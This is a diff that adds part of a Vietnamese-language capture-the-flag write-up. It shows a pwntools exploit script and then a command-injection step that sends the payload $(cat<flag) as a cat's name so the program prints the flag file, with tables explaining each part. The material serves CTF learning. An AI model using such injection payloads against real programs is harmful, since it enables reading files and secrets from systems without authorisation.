@@ -66,3 +66,38 @@ p.recvuntil(b"let people know your cat's name")
 log.success('Bypassed all 37 jumps!')
 p.interactive()
 ```
+
+```sh
+echo "$(cat<flag)" > /tmp/cat_db
+```
+
+
+| Thành phần | Ý nghĩa |
+|---|---|
+| `$(...)` | Thực thi lệnh bên trong và lấy output |
+| `cat` | In nội dung file |
+| `<flag` | Chuyển file `flag` thành standard input |
+| `"$(cat<flag)"` | Thay thế bằng nội dung file `flag` trong dấu nháy kép |
+| `> /tmp/cat_db` | Ghi kết quả vào file `/tmp/cat_db` |
+
+
+```python
+p.recvuntil(b"let people know your cat's name")
+
+payload = b'$(cat<flag)'
+p.sendline(payload)
+
+log.success("Command Injection payload sent!")
+
+print(p.recvall(timeout=2).decode(errors="replace"))
+```
+
+| Thành phần | Ý nghĩa |
+|---|---|
+| `recvuntil()` | Đợi chương trình hỏi tên mèo |
+| `payload` | Chứa cú pháp command substitution |
+| `sendline()` | Gửi payload kèm byte `\n` |
+| `recvall()` | Nhận output còn lại cho đến khi chương trình kết thúc hoặc hết thời gian chờ |
+| `decode(errors="replace")` | Chuyển dữ liệu nhận được thành văn bản để hiển thị |
+
+
